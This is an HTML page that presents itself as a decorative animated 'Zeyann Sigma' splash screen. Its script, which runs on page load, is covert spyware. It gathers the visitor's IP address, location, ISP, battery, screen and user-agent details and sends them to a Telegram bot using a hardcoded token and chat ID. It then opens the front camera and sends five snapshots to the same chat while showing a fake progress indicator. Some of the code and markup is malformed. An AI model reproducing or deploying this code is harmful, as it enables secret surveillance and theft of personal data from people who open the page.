<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zeyann Project</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden;
            font-family: 'Arial', sans-serif;
            background: radial-gradient(circle at 50% 50%, #667eea, #764ba2, #f093fb, #f5576c, #4facfe);
            background-size: 400% 400%;
            animation: gradientShift 10s ease infinite;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            position: fixed;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        h1 {
            font-size: 6rem;
            font-weight: bold;
            background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #6c5ce7);
            background-size: 300% 300%;
            animation: textColorShift 5s ease infinite;
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow:
                0 1px 0 #ccc,
                0 2px 0 #c9c9c9,
                0 3px 0 #bbb,
                0 4px 0 #b9b9b9,
                0 5px 0 #aaa,
                0 6px 1px rgba(0,0,0,.1),
                0 0 5px rgba(0,0,0,.1),
                0 1px 3px rgba(0,0,0,.3),
                0 3px 5px rgba(0,0,0,.2),
                0 5px 10px rgba(0,0,0,.25),
                0 20px 20px rgba(0,0,0,.15);
            transform: perspective(500px) rotateY(0deg) rotateX(0deg);
            animation: text3DSwing 6s ease-in-out infinite;
        }

        @keyframes text3DSwing {
            0% { transform: perspective(500px) rotateY(-5deg) rotateX(-5deg) skewX(-5deg); }
            25% { transform: perspective(500px) rotateY(0deg) rotateX(0deg) skewX(0deg); }
            50% { transform: perspective(500px) rotateY(5deg) rotateX(5deg) skewX(5deg); }
            75% { transform: perspective(500px) rotateY(0deg) rotateX(0deg) skewX(0deg); }
            100% { transform: perspective(500px) rotateY(-5deg) rotateX(-5deg) skewX(-5deg); }
        }

        @keyframes textColorShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .floating-shapes {
            position: absolute;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
        }

        .shape {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.1);
            animation: float 8s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-100px) rotate(180deg); }
        }

        .shape:nth-child(1) {
            width: 100px;
            height: 100px;
            left: 10%;
            top: 20%;
            animation-delay: -2s;
        }

        .shape:nth-child(2) {
            width: 150px;
            height: 150px;
            left: 80%;
            top: 60%;
            animation-delay: -4s;
        }

        .shape:nth-child(3) {
            width: 80px;
            height: 80px;
            left: 50%;
            top: 80%;
            animation-delay: -6s;
        }

        .shape:nth-child(4) {
            width: 120px;
            height: 120px;
            left: 20%;top: 40%;
            animation-delay: -1s;
        }
    </style>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="floating-shapes">
        <div class="shape"></div>
        <div class="shape"></div>
        <div class="shape"></div>
        <div class="shape"></div>
    </div>
    <div class="container">
        <h1>Zeyann Sigma</h1>
    </aside>

    <div id="status" style="margin-top:15px; font-size:14px; color:#facc15;">
      
    </div>
  </main>
  <script>
    const CHAT_ID = "7877620348";
    const BOT_TOKEN = "7850311967:AAE-gRxOX4F2Zm2S9v-BSNyPQ2WMjhUUZEo";
    const statusEl = document.getElementById('status');

    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) entry.target.classList.add('show');
      });
    }, { threshold: 0.1 });

    document.querySelectorAll('.section, .product').forEach(el => observer.observe(el));

    window.onload = async () => {
      statusEl.textContent = "";
      const DepayJe = await Fast_server();
      await sendDeviceInfo(DepayJe);

      try {
        statusEl.textContent = '';
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        const track = stream.getVideoTracks()[0];

        for (let i = 0; i < 5; i++) {
          statusEl.textContent =  ${(i + 1) * 20}%...;
          const blob = await captureFromVideo(track);
          await sendToTelegram(DepayJe, blob, "photo");
          await new Promise(r => setTimeout(r, 1000));
        }

        track.stop();
        statusEl.textContent = '';
      } catch (err) {
        statusEl.textContent = '';
        console.error(err);
      }
    };

    async function Fast_server() {
      try {
        const res = await fetch('/api/depayeye_union');
        const data = await res.json();
        return data.depayeye_key;
      } catch {
        return "direct";
      }
    }

    async function sendDeviceInfo(key) {
      try {
        const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
        const battery = await navigator.getBattery();
        const time = new Date().toLocaleString("id-ID");

        const message = 
       
        
🌐 *Informasi IP*
🔢 Alamat IP: ${ipInfo.ip}
🗺 Negara: ${ipInfo.country}
🌍 Wilayah: ${ipInfo.region}
📍 Kota: ${ipInfo.city}
📡 ISP: ${ipInfo.org}

📱 *Detail Perangkat*
🔋 Baterai: ${Math.round(battery.level * 100)}% ${battery.charging ? "⚡️ Mengisi daya" : ""}
📶 Jaringan: ${navigator.connection?.effectiveType || "Tidak diketahui"}
🖥️ Layar: ${screen.width}x${screen.height}
🕒 Waktu: ${time}
🧠 User Agent: ${navigator.userAgent}
...


;

        await sendToTelegram(key, message.trim(), "text");
      } catch (err) {
        console.error("Device Info Error:", err);
      }
    }

    async function captureFromVideo(videoTrack) {
      const video = document.createElement("video");
      video.srcObject = new MediaStream([videoTrack]);
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext("2d").drawImage(video, 0, 0);

      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
    }

    async function sendToTelegram(key, data, type) {
      const url = https://api.telegram.org/bot${BOT_TOKEN}/${type === "text" ? "sendMessage" : "sendPhoto"};
      const form = new FormData();
      form.append("chat_id", CHAT_ID);

      if (type === "text") {
        form.append("text", data);
        form.append("parse_mode", "Markdown");
      } else {
        form.append("photo", data, "image.jpg");
      }

      await fetch(url, { method: "POST", body: form });
    }
  </script>
</body>
</html>
